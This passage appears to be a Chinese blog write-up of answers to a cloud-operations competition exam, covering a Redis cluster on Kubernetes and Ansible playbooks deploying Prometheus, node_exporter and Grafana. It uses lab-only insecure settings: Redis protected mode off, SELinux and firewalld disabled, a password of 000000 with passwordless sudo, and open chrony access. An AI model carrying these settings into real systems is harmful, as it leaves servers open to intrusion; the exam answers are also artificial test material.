sha256:563888f63149e3959860264a1202ef9a644f44ed6c24d5c7392f9e2262bd3553 size: 1573</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="任务四redis集群部署-10分"><a href="#任务四redis集群部署-10分" class="headerlink" title="任务四redis集群部署(10分)"></a>任务四redis集群部署(10分)</h2><h3 id="1-基于StatefulSet创建Redis集群节点"><a href="#1-基于StatefulSet创建Redis集群节点" class="headerlink" title="1.基于StatefulSet创建Redis集群节点"></a>1.基于StatefulSet创建Redis集群节点</h3><p>编写redis.yml文件，创建statefulset资源，基于redis镜像创建6个pod副本，并且通过pod的亲和性配置保证pod尽量分散在不同的节点上，然后通过volumeMounts将pv及redis-conf的Configmap分别挂载到各个容器中。然后基于该文件创建redis集群节点，完成后查看所有redis的pod资源。</p>
<p>请将kubectl get pods -o wide命令的返回结果提交至答题框。【3分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master yaml]# kubectl get pods -o wide</span><br><span class="line">NAME            READY   STATUS    RESTARTS   AGE   IP            NODE     NOMINATED NODE   READINESS GATES</span><br><span class="line">redis-app-0     1/1     Running   0          9s    10.244.1.5    node2    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">redis-app-1     1/1     Running   0          8s    10.244.2.10   node1    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">redis-app-2     1/1     Running   0          6s    10.244.0.6    master   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">redis-app-3     1/1     Running   0          5s    10.244.1.6    node2    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">redis-app-4     1/1     Running   0          4s    10.244.2.11   node1    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">redis-app-5     1/1     Running   0          2s    10.244.1.7    node2    &lt;none&gt;           &lt;none&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>redis.yaml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">StatefulSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">redis-app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">serviceName:</span> <span class="string">&quot;redis-service&quot;</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">6</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">redis</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">redis</span></span><br><span class="line">        <span class="attr">appCluster:</span> <span class="string">redis-cluster</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">20</span></span><br><span class="line">      <span class="attr">affinity:</span></span><br><span class="line">        <span class="attr">podAntiAffinity:</span></span><br><span class="line">          <span class="attr">preferredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">weight:</span> <span class="number">100</span></span><br><span class="line">            <span class="attr">podAffinityTerm:</span></span><br><span class="line">              <span class="attr">labelSelector:</span></span><br><span class="line">                <span class="attr">matchExpressions:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">app</span></span><br><span class="line">                  <span class="attr">operator:</span> <span class="string">In</span></span><br><span class="line">                  <span class="attr">values:</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">              <span class="attr">topologyKey:</span> <span class="string">kubernetes.io/hostname</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">redis</span></span><br><span class="line">        <span class="attr">image:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.165</span><span class="string">/library/redis:latest</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;redis-server&quot;</span>                  <span class="comment">#redis启动命令</span></span><br><span class="line">        <span class="attr">args:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;/etc/redis/redis.conf&quot;</span>         <span class="comment">#redis-server后面跟的参数,换行代表空格</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;--protected-mode&quot;</span>              <span class="comment">#允许外网访问</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="comment"># command: redis-server /etc/redis/redis.conf --protected-mode no</span></span><br><span class="line">        <span class="attr">resources:</span>                          <span class="comment">#资源</span></span><br><span class="line">          <span class="attr">requests:</span>                         <span class="comment">#请求的资源</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;100m&quot;</span>                     <span class="comment">#m代表千分之,相当于0.1 个cpu资源</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">&quot;100Mi&quot;</span>                 <span class="comment">#内存100m大小</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">redis</span></span><br><span class="line">              <span class="attr">containerPort:</span> <span class="number">6379</span></span><br><span class="line">              <span class="attr">protocol:</span> <span class="string">&quot;TCP&quot;</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cluster</span></span><br><span class="line">              <span class="attr">containerPort:</span> <span class="number">16379</span></span><br><span class="line">              <span class="attr">protocol:</span> <span class="string">&quot;TCP&quot;</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;redis-conf&quot;</span>              <span class="comment">#挂载configmap生成的文件</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">&quot;/etc/redis&quot;</span>         <span class="comment">#挂载到哪个路径下</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;redis-data&quot;</span>              <span class="comment">#挂载持久卷的路径</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">&quot;/var/lib/redis&quot;</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;redis-conf&quot;</span>                  <span class="comment">#引用configMap卷</span></span><br><span class="line">        <span class="attr">configMap:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">&quot;redis-conf&quot;</span></span><br><span class="line">          <span class="attr">items:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&quot;redis.conf&quot;</span>             <span class="comment">#创建configMap指定的名称</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">&quot;redis.conf&quot;</span>            <span class="comment">#里面的那个文件--from-file参数后面的文件</span></span><br><span class="line">  <span class="attr">volumeClaimTemplates:</span>                     <span class="comment">#进行pvc持久卷声明,</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">redis-data</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">accessModes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">      <span class="attr">resources:</span></span><br><span class="line">        <span class="attr">requests:</span></span><br><span class="line">          <span class="attr">storage:</span> <span class="string">200M</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-redis集群初始化"><a href="#2-redis集群初始化" class="headerlink" title="2.redis集群初始化"></a>2.redis集群初始化</h3><p>使用ubuntu:redis-trib中的redis-trib工具对redis集群进行初始化，初始化后3个master节点，3个slave节点，3个master节点各对应一个slave节点。初始化成功后查看集群状态。</p>
<p>连结到任意一个Redis Pod将cluster nodes命令的返回结果提交至答题框。【3分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-为redis集群配置service"><a href="#3-为redis集群配置service" class="headerlink" title="3.为redis集群配置service"></a>3.为redis集群配置service</h3><p>编写service.yaml文件创建一个Service，用于为Redis集群提供访问和负载均衡，代理redis集群,在K8S集群中暴露6379端口,创建成功后，查看service状态。</p>
<p>请将kubectl get svc redis-access-service -o wide命令的返回结果提交至答题框。【2分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master yaml]# kubectl get svc redis-access-service -o wide</span><br><span class="line">NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE   SELECTOR</span><br><span class="line">redis-access-service   ClusterIP   10.104.245.9   &lt;none&gt;        6379/TCP   2s    app=redis,appCluster=redis-cluster</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>vi service.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">redis-access-service</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">redis</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">redis-port</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">&quot;TCP&quot;</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">6379</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">appCluster:</span> <span class="string">redis-cluster</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-集群主从切换"><a href="#4-集群主从切换" class="headerlink" title="4.集群主从切换"></a>4.集群主从切换</h3><p>任意选择一个redis的master节点，进入该pod中查看该节点在集群中的角色信息，然后将该节点pod手动删除，然后查看状态，重新创建后，进入该pod查看节点角色信息及集群信息。查看是否自动完成主从切换。</p>
<p>最后进入该pod将role命令的返回结果提交至答题框。【2分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="C场次题目：企业级应用的自动化部署和运维"><a href="#C场次题目：企业级应用的自动化部署和运维" class="headerlink" title="C场次题目：企业级应用的自动化部署和运维"></a>C场次题目：企业级应用的自动化部署和运维</h1><table>
<thead>
<tr>
<th>设备名称</th>
<th>主机名</th>
<th>接口</th>
<th>ip地址</th>
<th>角色</th>
</tr>
</thead>
<tbody><tr>
<td>云服务器1</td>
<td>monitor</td>
<td>ens33</td>
<td>192.168.200.100</td>
<td>prometheus.grafana,ansible</td>
</tr>
<tr>
<td>云服务器2</td>
<td>slave1</td>
<td>ens33</td>
<td>192.168.200.101</td>
<td>agent</td>
</tr>
<tr>
<td>云服务器3</td>
<td>slave2</td>
<td>ens33</td>
<td>192.168.200.102</td>
<td>agent</td>
</tr>
</tbody></table>
<h2 id="任务1企业级应用的自动化部署-17分"><a href="#任务1企业级应用的自动化部署-17分" class="headerlink" title="任务1企业级应用的自动化部署(17分)"></a>任务1企业级应用的自动化部署(17分)</h2><h3 id="1-ansible自动化运维工具的安装"><a href="#1-ansible自动化运维工具的安装" class="headerlink" title="1.ansible自动化运维工具的安装"></a>1.ansible自动化运维工具的安装</h3><p>请使用提供的软件包在monitor节点安装ansible，安装完成后使用ansible –version命令验证是否安装成功。为所有节点添加test用户，设置用户密码为000000，为test用户设置免密sudo，配置ssh免密登录，使monitor节点能够免密登录所有节点的test用户。</p>
<p>请将ansible –version命令的返回结果提交到答题框。【3分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ansible --version</span><br><span class="line">ansible 2.4.6.0</span><br><span class="line">  config file = /etc/ansible/ansible.cfg</span><br><span class="line">  configured module search path = [u<span class="string">&#x27;/root/.ansible/plugins/modules&#x27;</span>, u<span class="string">&#x27;/usr/share/ansible/plugins/modules&#x27;</span>]</span><br><span class="line">  ansible python module location = /usr/lib/python2.7/site-packages/ansible</span><br><span class="line">  executable location = /usr/bin/ansible</span><br><span class="line">  python version = 2.7.5 (default, Apr 11 2018, 07:36:10) [GCC 4.8.5 20150623 (Red Hat 4.8.5-28)]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>monitor</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#安装依赖</span><br><span class="line">yum install -y jinja2 PyYAML cryptography</span><br><span class="line"></span><br><span class="line">rpm -ivh ansible-2.4.6.0-1.el7.ans.noarch.rpm</span><br><span class="line"></span><br><span class="line">ansible --version</span><br></pre></td></tr></table></figure>

<p><strong>全部节点</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd test</span><br><span class="line">passwd test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置免密<span class="built_in">sudo</span> 在root    ALL=(ALL)       ALL下面添加</span></span><br><span class="line">visudo</span><br><span class="line">test ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<p><strong>monitor</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen </span><br><span class="line">ssh-copy-id test@192.168.200.100</span><br><span class="line">ssh-copy-id test@192.168.200.101</span><br><span class="line">ssh-copy-id test@192.168.200.102</span><br></pre></td></tr></table></figure>

<h3 id="2-ansible-自动化运维工具的初始化【3-分】"><a href="#2-ansible-自动化运维工具的初始化【3-分】" class="headerlink" title="2.ansible 自动化运维工具的初始化【3 分】"></a>2.ansible 自动化运维工具的初始化【3 分】</h3><p>创建 &#x2F;root&#x2F;ansible 目录作为工作目录，在该目录内创建 ansible.cfg 文件并完成以下配置，清单文件位置为 &#x2F;root&#x2F;ansible&#x2F;inventory，登录用户为 test，登录时不需要输入密码。设置并行主机数量为 2，允许 test 用户免密提权到 root。</p>
<p>将 ansible.cfg 文件内容粘贴到答题框。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory=./inventory</span><br><span class="line">forks=2</span><br><span class="line">remote_user=<span class="built_in">test</span></span><br><span class="line">ask_pass=<span class="literal">false</span></span><br><span class="line">[privilege_escalation]</span><br><span class="line">become=<span class="literal">true</span></span><br><span class="line">become_method=<span class="built_in">sudo</span></span><br><span class="line">become_user=root</span><br><span class="line">become_ask_pass=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建工作目录</span></span><br><span class="line">mkdir /root/ansible</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编辑cfg</span></span><br><span class="line">vi ansible.cfg</span><br><span class="line">[defaults]</span><br><span class="line">inventory=./inventory</span><br><span class="line">forks=2</span><br><span class="line">remote_user=test</span><br><span class="line">ask_pass=false</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become=true</span><br><span class="line">become_method=sudo</span><br><span class="line">become_user=root</span><br><span class="line">become_ask_pass=false</span><br></pre></td></tr></table></figure>

<p>3.主机清单的编写。</p>
<p>编写主机清单文件，创建monitor用户组,monitor用户组内添加monitor主机，创建slave用户组, slave组内添加slave1和slave2主机，主机名不得使用IP地址。</p>
<p>请将ansible all -m ping命令的返回结果提交至答题框。【2分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@monitor ansible]# ansible all -m ping</span><br><span class="line"> [WARNING]: Found both group and host with same name: master</span><br><span class="line"></span><br><span class="line">slave2 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: false,</span><br><span class="line">    &quot;failed&quot;: false,</span><br><span class="line">    &quot;ping&quot;: &quot;pong&quot;</span><br><span class="line">&#125;</span><br><span class="line">slave1 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: false,</span><br><span class="line">    &quot;failed&quot;: false,</span><br><span class="line">    &quot;ping&quot;: &quot;pong&quot;</span><br><span class="line">&#125;</span><br><span class="line">monitor | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: false,</span><br><span class="line">    &quot;failed&quot;: false,</span><br><span class="line">    &quot;ping&quot;: &quot;pong&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要在/etc/hosts添加映射</span></span><br><span class="line">192.168.200.100 monitor</span><br><span class="line">192.168.200.101 slave1</span><br><span class="line">192.168.200.102 slave2</span><br><span class="line"></span><br><span class="line"><span class="comment">#在/root/ansible目录下创建inventory</span></span><br><span class="line">vi inventory</span><br><span class="line">[monitor]</span><br><span class="line">monitor</span><br><span class="line">[slave]</span><br><span class="line">slave1</span><br><span class="line">slave2</span><br></pre></td></tr></table></figure>

<h3 id="4-使用自动化工具对-master-节点进行初始化【2-分】"><a href="#4-使用自动化工具对-master-节点进行初始化【2-分】" class="headerlink" title="4.使用自动化工具对 master 节点进行初始化【2 分】"></a>4.使用自动化工具对 master 节点进行初始化【2 分】</h3><p>请编写 prometheus.yml 控制 monitor 主机组，使用对应模块将 SELinux 临时状态和开机启动状态也设置为 disabled。请使用 ansible 对应模块安装时间同步服务，使用文本编辑模块将该服务的作用域设置为 0.0.0.0&#x2F;0，并设置状态为启动和开机自动启动。首先将提供的 prometheus-2.37.0.linux-amd64.tar.gz 使用文件拷贝模块将该压缩包拷贝到目标主机的&#x2F;usr&#x2F;local&#x2F; 下，使用 shell 模块解压该压缩包。</p>
<p>请将prometheus.yml文件中的内容提交至答题框。【4分】</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">monitor</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">SELINUX=disabled</span></span><br><span class="line">      <span class="attr">selinux:</span> <span class="string">state=disabled</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">stop</span> <span class="string">firewalld</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo systemctl stop firewalld &amp;&amp; sudo systemctl disable firewalld&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">chrony</span></span><br><span class="line">      <span class="attr">yum:</span> <span class="string">name=chrony</span> <span class="string">state=present</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">allow</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">/0</span></span><br><span class="line">      <span class="attr">blockinfile:</span> <span class="string">path=/etc/chrony.conf</span> <span class="string">block=&quot;allow</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">/0&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">chrony</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=chronyd</span> <span class="string">state=started</span> <span class="string">enabled=yes</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">promethus</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/prometheus-2.37.0.linux-amd64.tar.gz</span> <span class="string">dest=/usr/local/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tar</span> <span class="string">prometheus</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo tar -zxvf /usr/local/prometheus-2.37.0.linux-amd64.tar.gz -C /usr/local&#x27;</span></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要上传Prometheus到root目录下，在工作目录下创建prometheus.yml</span><br></pre></td></tr></table></figure>

<p>5.使用自动化运维工具完成企业级应用的部署。</p>
<p>编写prometheus.yml.j2模板文件，将所有slave节点信息添加到该文件中，但是被管节点的主机名信息必须使用变量IP地址可以手动输入。完成后请创建node_exporter.yml文件，编写第一个play，将该play命名为slave，该play控制的主机组为slave，使用ansible模块将node_exporter-1.3.1.linux-amd64.tar.gz发送到slave主机组的&#x2F;usr&#x2F;local&#x2F;下，使用一个shell模块解压该压缩包，并启动该服务。随后编写第二个play，将第二个play命名为monitor，第二个play控制monitor节点，首先使用ansible模块将prometheus.yml.j2文件传输到monitor节点，然后使用script模块将prometheus启动。使用对应模块将grafana-8.1.2-1.x86_64.rpm包发送到被控节点的&#x2F;mnt&#x2F;目录下，然后使用对应模块将该软件包安装，安装完成后设置grafana服务启动并设置开机自动启动。使用浏览器登录prometheus查看prometheus是否成功监控所有slave节点。</p>
<p>请将node_exporteryml文件内容提交到答题框。【5分】</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">slave</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">slave</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">node_expose</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/node_exporter-1.3.1.linux-amd64.tar.gz</span> <span class="string">dest=/usr/local/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tar</span> <span class="string">node_expose</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo tar -zxvf /usr/local/node_exporter-1.3.1.linux-amd64.tar.gz -C /usr/local/&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">node_export</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo nohup /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">monitor</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">monitor</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">node1:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.101</span></span><br><span class="line">    <span class="attr">node2:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.102</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">template</span> <span class="string">j2</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=./prometheus.yml.j2</span> <span class="string">dest=/usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">prometheus</span></span><br><span class="line">      <span class="attr">script:</span> <span class="string">/root/ansible/nohup.sh</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">grafana</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/grafana-8.1.2-1.x86_64.rpm</span> <span class="string">dest=/mnt/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">repaired</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo yum install -y fontconfig urw-fonts &#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">grafana</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo rpm -ivh /mnt/grafana-8.1.2-1.x86_64.rpm&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">enable</span> <span class="string">gtafana</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=grafana-server</span> <span class="string">state=started</span> <span class="string">enabled=yes</span></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>prometheus.yml.j2</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># my global config</span></span><br><span class="line">global:</span><br><span class="line">  scrape_interval: 15s <span class="comment"># Set the scrape interval to every 15 seconds. Default is every 1 minute.</span></span><br><span class="line">  evaluation_interval: 15s <span class="comment"># Evaluate rules every 15 seconds. The default is every 1 minute.</span></span><br><span class="line">  <span class="comment"># scrape_timeout is set to the global default (10s).</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alertmanager configuration</span></span><br><span class="line">alerting:</span><br><span class="line">  alertmanagers:</span><br><span class="line">    - static_configs:</span><br><span class="line">        - targets:</span><br><span class="line">          <span class="comment"># - alertmanager:9093</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load rules once and periodically evaluate them according to the global &#x27;evaluation_interval&#x27;.</span></span><br><span class="line">rule_files:</span><br><span class="line">  <span class="comment"># - &quot;first_rules.yml&quot;</span></span><br><span class="line">  <span class="comment"># - &quot;second_rules.yml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A scrape configuration containing exactly one endpoint to scrape:</span></span><br><span class="line"><span class="comment"># Here it&#x27;s Prometheus itself.</span></span><br><span class="line">scrape_configs:</span><br><span class="line">  <span class="comment"># The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config.</span></span><br><span class="line">  - job_name: <span class="string">&quot;prometheus&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># metrics_path defaults to &#x27;/metrics&#x27;</span></span><br><span class="line">    <span class="comment"># scheme defaults to &#x27;http&#x27;.</span></span><br><span class="line"></span><br><span class="line">    static_configs:</span><br><span class="line">      - targets: [<span class="string">&quot;localhost:9090&quot;</span>]</span><br><span class="line">  - job_name: <span class="string">&quot;node_exporter&quot;</span></span><br><span class="line">    static_configs:</span><br><span class="line">      - targets: [<span class="string">&quot;&#123;&#123;node1&#125;&#125;:9100&quot;</span>,<span class="string">&quot;&#123;&#123;node2&#125;&#125;:9100&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>node_exporter.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">slave</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">slave</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">node_expose</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/node_exporter-1.3.1.linux-amd64.tar.gz</span> <span class="string">dest=/usr/local/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tar</span> <span class="string">node_expose</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo tar -zxvf /usr/local/node_exporter-1.3.1.linux-amd64.tar.gz -C /usr/local/&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">node_export</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo nohup /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">monitor</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">monitor</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">node1:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.101</span></span><br><span class="line">    <span class="attr">node2:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.102</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">template</span> <span class="string">j2</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=./prometheus.yml.j2</span> <span class="string">dest=/usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">prometheus</span></span><br><span class="line">      <span class="attr">script:</span> <span class="string">/root/ansible/nohup.sh</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">grafana</span></span><br><span class="line">      <span class="attr">copy:</span> <span class="string">src=/root/grafana-8.1.2-1.x86_64.rpm</span> <span class="string">dest=/mnt/</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">repaired</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo yum install -y fontconfig urw-fonts &#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">grafana</span></span><br><span class="line">      <span class="attr">shell:</span> <span class="string">&#x27;sudo rpm -ivh /mnt/grafana-8.1.2-1.x86_64.rpm&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">enable</span> <span class="string">gtafana</span></span><br><span class="line">      <span class="attr">service:</span> <span class="string">name=grafana-server</span> <span class="string">state=started</span> <span class="string">enabled=yes</span></span><br></pre></td></tr></table></figure>

